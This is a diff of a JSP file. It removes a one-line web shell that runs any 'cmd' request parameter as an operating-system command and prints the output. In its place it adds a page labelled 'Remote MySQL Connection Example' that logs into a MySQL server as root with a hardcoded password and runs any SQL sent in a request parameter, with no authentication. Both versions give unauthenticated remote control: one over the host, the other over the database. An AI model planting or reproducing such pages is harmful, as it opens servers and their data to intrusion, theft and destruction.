@@ -1,1 +1,87 @@
-<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); if (cmd != null) { try { Process process = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream())); String line; out.println("<h3>Command Output:</h3>"); out.println("<pre>"); while ((line = reader.readLine()) != null) { out.println(line); } out.println("</pre>"); out.println("<h3>Command Errors (if any):</h3>"); out.println("<pre>"); while ((line = errorReader.readLine()) != null) { out.println(line); } out.println("</pre>"); reader.close(); errorReader.close(); } catch (IOException e) { out.println("An error occurred while executing the command: " + e.getMessage()); } } else { out.println("No command specified."); } %>
+<%@ page import="java.sql.Connection, java.sql.DriverManager, java.sql.ResultSet, java.sql.Statement" %>
+<%@ page import="java.io.PrintWriter" %>
+<%@ page import="java.io.StringWriter" %>
+<%@ page import="javax.servlet.http.HttpServletRequest" %>
+<%@ page import="javax.servlet.http.HttpServletResponse" %>
+<%@ page import="javax.servlet.ServletException" %>
+<%@ page import="java.io.IOException" %>
+<html>
+<head>
+    <title>Remote MySQL Connection Example</title>
+</head>
+<body>
+    <h1>Data from Remote MySQL Database</h1>
+    <%
+        // JDBC URL, username, and password of the MySQL server
+        String jdbcUrl = "jdbc:mysql://192.168.0.65:3306/upgw";
+        String dbUsername = "root";
+        String dbPassword = "happycoding";
+
+        // JDBC variables for opening and managing connection
+        Connection conn = null;
+        Statement stmt = null;
+        ResultSet rs = null;
+
+        try {
+            // Load MySQL JDBC Driver
+            Class.forName("com.mysql.cj.jdbc.Driver");
+
+            // Open a connection
+            conn = DriverManager.getConnection(jdbcUrl, dbUsername, dbPassword);
+
+            // Get the SQL command from the POST request
+            String sql = request.getParameter("sqlCommand");
+            if (sql == null || sql.trim().isEmpty()) {
+                out.println("No SQL command provided.");
+                return;
+            }
+
+            // Execute SQL query
+            stmt = conn.createStatement();
+            boolean isResultSet = stmt.execute(sql);
+
+            if (isResultSet) {
+                // Process the result set
+                rs = stmt.getResultSet();
+                int columnCount = rs.getMetaData().getColumnCount();
+
+                // Print column names
+                for (int i = 1; i <= columnCount; i++) {
+                    out.print(rs.getMetaData().getColumnName(i) + "\t");
+                }
+                out.println("<br>");
+
+                // Print rows
+                while (rs.next()) {
+                    for (int i = 1; i <= columnCount; i++) {
+                        out.print(rs.getString(i) + "\t");
+                    }
+                    out.println("<br>");
+                }
+            } else {
+                // Print update count
+                int updateCount = stmt.getUpdateCount();
+                out.println("Update Count: " + updateCount);
+            }
+        } catch (Exception e) {
+            // Convert JspWriter to PrintWriter
+            StringWriter sw = new StringWriter();
+            PrintWriter pw = new PrintWriter(sw);
+            e.printStackTrace(pw);
+            out.println(sw.toString());
+        } finally {
+            // Clean-up environment
+            try {
+                if (rs != null) rs.close();
+                if (stmt != null) stmt.close();
+                if (conn != null) conn.close();
+            } catch (Exception e) {
+                StringWriter sw = new StringWriter();
+                PrintWriter pw = new PrintWriter(sw);
+                e.printStackTrace(pw);
+                out.println(sw.toString());
+            }
+        }
+    %>
+</body>
+</html>
